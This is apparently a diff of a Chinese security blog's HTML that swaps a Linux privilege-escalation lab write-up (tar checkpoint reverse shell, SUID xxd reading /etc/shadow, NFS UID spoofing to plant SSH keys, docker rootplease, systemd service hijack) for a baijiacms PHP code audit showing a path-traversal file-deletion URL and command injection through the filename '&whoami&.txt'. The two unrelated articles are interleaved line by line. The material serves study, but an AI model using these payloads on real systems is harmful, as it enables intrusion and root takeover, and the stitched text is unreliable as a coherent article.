class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(WEB_ROOT.<span class="string">&#x27;/includes/lib/lib_oss.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$oss</span>=<span class="keyword">new</span> baijiacms_oss();</span><br><span class="line">		<span class="variable">$oss</span>-&gt;deletefile(<span class="variable">$file_relative_path</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">if</span> (is_file(SYSTEM_WEBROOT . <span class="string">&#x27;/attachment/&#x27;</span> . <span class="variable">$file_relative_path</span>)) &#123;</span><br><span class="line">		unlink(SYSTEM_WEBROOT . <span class="string">&#x27;/attachment/&#x27;</span> . <span class="variable">$file_relative_path</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>–checkpoint-action=ACTION</code> 在每个checkpoint（检查点）上执行ACTION</p>
-<p>为什么这个提权能成功呢？因为我们相当于用到了tar命令的<code>--checkpoint</code>与<code>--checkpoint-action</code>参数，让他在打包文件时执行了我们的命令。就反弹了shell。</p>
-<h2 id="敏感隐藏文件"><a href="#敏感隐藏文件" class="headerlink" title="敏感隐藏文件"></a>敏感隐藏文件</h2><p>有时候隐藏文件可能会存放一些重要信息，比如我们搜索home目录下的所有隐藏文件，并用ls -al来显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.*&quot; -type f -path &quot;/home/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>关键点在于只要跳过上面的if条件，进入下面的else条件，就可以进行任意文件删除。而if条件是关于一个叫做system_isnetattach的东西。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818172910073.png" alt="image-20220818172910073"></p>
+<p>找了很久都不知道这个到底是什么东西，翻译出来叫做附件，看了网上的wp才知道<code>system_isnetattach</code>是设置图片压缩比例。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818173028505.png" alt="image-20220818173028505"></p>
+<p>那么接下来我们到了else环节，else环节的代码一目了然。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818170821451.png" alt="image-20220818170821451"></p>
+<p>现在我们需要找到<code>file_delete</code>函数调用的地方。可以发现是在<code>system/eshop/core/mobile/util/uploader.php</code>里面。</p>
+<p>先去源码目录创建一个新的文件<code>test.txt</code></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818173403709.png" alt="image-20220818173403709"></p>
+<p>由于利用的参数在baijiacms-master/system/eshop/core/mobile/util/uploader.php文件的upload分支下，参数名为file。所以直接构造url为：<code>http://localhost:8097/index.php?mod=mobile&amp;act=uploader&amp;op=post&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../test.txt</code></p>
+<p>删除成功。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818174034952.png" alt="image-20220818174034952"></p>
+<p>我也没搞懂怎么找到这个路由的。</p>
+<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><p>在<code>http://localhost:8097/index.php?mod=site&amp;act=weixin&amp;do=setting&amp;beid=1</code>中有一个上传微信验证文件的选项。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175041589.png" alt="image-20220818175041589"></p>
+<p>使用burp可以抓包到里面的路由为</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175308892.png" alt="image-20220818175308892"></p>
+<p>根据对应路由，找到代码是</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175346691.png" alt="image-20220818175346691"></p>
+<p>同时在数据包中，发现传入的文件参数名称为：weixin_verify_file。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175451144.png" alt="image-20220818175451144"></p>
+<p>发现在setting文件中有相关描述。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175622737.png" alt="image-20220818175622737"></p>
+<p>大致的意思是先判断文件后缀名是不是txt格式，然后用file_save函数处理文件，并且file_save函数中参数file[‘name’]就是上传的文件的名字：&amp;whoami&amp;.txt。</p>
+<p>然后再file_save函数当中，传进来了五个参数</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818180617409.png" alt="image-20220818180617409"></p>
+<p>file_full_path里面有我们上传的文件名<code>&amp;whoami&amp;.txt</code>。</p>
+<p>而其中最重要的是该方法中调用了system函数，其中也会把我们的file_full_path参数带进去，我们的&amp;whoami$.txt恰巧可以通过&amp;（与）的分割，来进行命令执行。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818180732121.png" alt="image-20220818180732121"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818181041898.png" alt="image-20220818181041898"></p>
+<h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>在<code>system/public/class/web/file.php</code>下面发现了以下分支。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$do</span> == <span class="string">&#x27;fetch&#x27;</span>) &#123;</span><br><span class="line">	<span class="variable">$url</span> = trim(<span class="variable">$_GPC</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span>=fetch_net_file_upload(<span class="variable">$url</span>);</span><br><span class="line">	<span class="keyword">if</span> (is_error(<span class="variable">$file</span>)) &#123;</span><br><span class="line">		<span class="variable">$result</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="variable">$file</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">		<span class="keyword">die</span>(json_encode(<span class="variable">$result</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>该命令是查找所有隐藏文件。并将无法访问的文件错误信息导入到/dev/null中。这样就会很清楚的只看到可以回显可以查看的文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115808687.png" alt="image-20220325115808687"></p>
-<p>发现susan目录下的秘密文件.secret。查看可以知道密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115851286.png" alt="image-20220325115851286"></p>
-<h2 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h2><p>Suid这个是uid+s的组合，s指的是特殊权限。一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root权限，就会配置特殊权限</p>
-<p>比如说passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
-<p>使用find命令快速查找所有suid文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm 4000 -type f -exec ls -al &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
-
-<h3 id="xxd提权"><a href="#xxd提权" class="headerlink" title="xxd提权"></a>xxd提权</h3><p>发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-x--- 1 root itservices 18552 Apr 10 2018 /usr/bin/xxd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325161742759.png" alt="image-20220325161742759"></p>
-<p>而组itservices具有执行权限，通过/etc/group发现susan用户属于Itservices用户组。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162035632.png" alt="image-20220325162035632"></p>
-<p>接下来可以通过刚才发现的敏感文件，切换到susan用户。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162858779.png" alt="image-20220325162858779"></p>
-<p>仍然可以使用上篇发现的网站用来查询在xxd有suid的情况下可以提权的命令。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162945722.png" alt="image-20220325162945722"></p>
-<p>这里的<code>LFILE</code>是在命令行中定义的变量，它被用于定义需要查看的文件。这里我们以<code>/etc/shadow</code>作为示例。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163139641.png" alt="image-20220325163139641"></p>
-<h3 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h3><p>除了xxd之外，在之前还有文件叫taskset也能用来提权。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163502734.png" alt="image-20220325163502734"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163523182.png" alt="image-20220325163523182"></p>
-<h2 id="第三方服务访问"><a href="#第三方服务访问" class="headerlink" title="第三方服务访问"></a>第三方服务访问</h2><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>什么是NFS？</p>
-<p>网络文件系统(NFS)是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准，网络附加存储(NAS)之一。</p>
-<p>我们用kali可以搜索到被害机器上开放着nfs服务。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164716494.png" alt="image-20220325164716494"></p>
-<p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.137.144</span><br></pre></td></tr></table></figure>
-
-<p>可以查看远程nfs服务器上的共享目录。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164813507.png" alt="image-20220325164813507"></p>
-<p>在kali机器上挂在远程目录</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325170408111.png" alt="image-20220325170408111"></p>
-<p>一般来说，可以把挂载出来的目录立即尝试添加authorized_key文件，从而实现ssh免密码登录，但是这里创造文件是不允许的，因为提示权限不够。即使我们在kali机器上是root权限，但是我们还是没有写入权限，这是因为默认情况下客户端的root身份会被分配成用户<code>nfsnobody</code>。</p>
-<p>解决方法是在kali上创建同靶机系统相同UID且相同用户名的账户，用其来写入文件。(即伪造文件所有者的UID和GID来欺骗nfs服务器。)</p>
-<p>在被害机器中我们可以知道peter账户的uid为1001，gid为1005.</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171318385.png" alt="image-20220325171318385"></p>
-<p>在kali机器中创建相同账户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g 1005 peter</span><br><span class="line">adduser peter -uid 1001 -gid 1005</span><br></pre></td></tr></table></figure>
-
-<p>切换到peter账户，可以在该目录下写文件了。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171521879.png" alt="image-20220325171521879"></p>
-<p>写入ssh公钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#[攻击机]ssh-keygen生成公私钥对</span><br><span class="line">ssg-keygen</span><br><span class="line">#创建.ssh目录</span><br><span class="line">peter@kali:/mnt/peter$ mkdir .ssh</span><br><span class="line">#传输public key</span><br><span class="line">peter@kali:/mnt/peter$ cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys</span><br><span class="line">#设置权限</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 700 ../.ssh/</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 600 authorized_keys</span><br><span class="line">#使用私钥登录</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325172400774.png" alt="image-20220325172400774"></p>
-<h2 id="docker组提权"><a href="#docker组提权" class="headerlink" title="docker组提权"></a>docker组提权</h2><p>peter用户属于docker组，docker组的成员，可以根据此漏洞来获取root的shell</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190543341.png" alt="image-20220325190543341"></p>
-<p><a target="_blank" rel="noopener" href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190947875.png" alt="image-20220325190947875"></p>
-<h2 id="systemd配置提权"><a href="#systemd配置提权" class="headerlink" title="systemd配置提权"></a>systemd配置提权</h2><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>历史上，Linux的启动一直采用init进程。</p>
-<p>下面的命令用来启动服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>
-
-<p>这种方法有两个缺点。</p>
-<p>1.启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
-<p>2.启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使脚本变得很长。</p>
-<p>systemd就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。使用了Systemd，就不需要再用init了。Systemd取代了init，成为了系统的第一个进行（pid等于1），其他进程都是它的子进程。Systemd并不是一个命令，而是一组命令，涉及到系统管理的方方面面。</p>
-<p>systemctl是systemd的主命令，用于管理系统。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"># 关闭系统，切断电源</span><br><span class="line">$ sudo systemctl poweroff systemd-analyze命令用于查看启动耗时。</span><br><span class="line"># 查看启动耗时</span><br><span class="line">$ systemd-analyze</span><br><span class="line"># 查看每个服务的启动耗时</span><br><span class="line">$ systemd-analyze blame</span><br><span class="line"># hostnamectl命令用于查看当前主机的信息。</span><br><span class="line"># 显示当前主机的信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"># 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname rhel7</span><br></pre></td></tr></table></figure>
-
-<h3 id="systemd提权"><a href="#systemd提权" class="headerlink" title="systemd提权"></a>systemd提权</h3><p>查看peter用户的systemd配置，发现peter这个用户拥有debug.service文件，并且他对这个文件具有读和写的权限。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325191943553.png" alt="image-20220325191943553"></p>
-<p>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
-<p>查看debug.service文件，这里我们可以修改<code>Execstart</code>行，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来自启动和重启服务时执行命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325192434111.png" alt="image-20220325192434111"></p>
-<p><code>/root/debug</code>这是一个二进制服务并且该服务以root身份运行。</p>
-<p>使用一个类似ssh可以sudo执行的方法。让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755</span><br><span class="line">/home/peter/systemdbash&#x27; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure>
-
-<p>该命令的意思是将bash复制到<code>/home/peter/systemdbash</code>下，并赋予权限，便于到时候我们可以直接执行SUID提权。</p>
-<p>之后更改<code>debug.service</code>下的<code>Execstart</code>行为<code>/home/peter/systemdexpl.sh</code></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325193614818.png" alt="image-20220325193614818"></p>
-<p>接下来就可以利用suid提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325194131842.png" alt="image-20220325194131842"></p>
+<p>而其中调用的函数<code>fetch_net_file_upload</code>函数，发现此函数中使用了file_get_contents函数获取文件，但是并没有进行任何过滤。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818181955379.png" alt="image-20220818181955379"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>太菜了，后头基本上是按照网上师傅的wp照在在做，但是任意命令执行这个漏洞确实是打开了我的视野。还有就是不知道他们是怎么做到精准找到php路由的，太菜了太菜了。</p>
 
       
 
@@ -352,7 +287,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">靶机渗透</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计</a>
         		</li>
       		
 		</ul>
@@ -408,7 +343,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -422,18 +357,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          常见中间件漏洞
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">shellcode的基础免杀</div>
+    <a href="/2022/08/17/jxc%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">jxc代码审计</div>
       <i class="icon-circle-right"></i>
     </a>
   
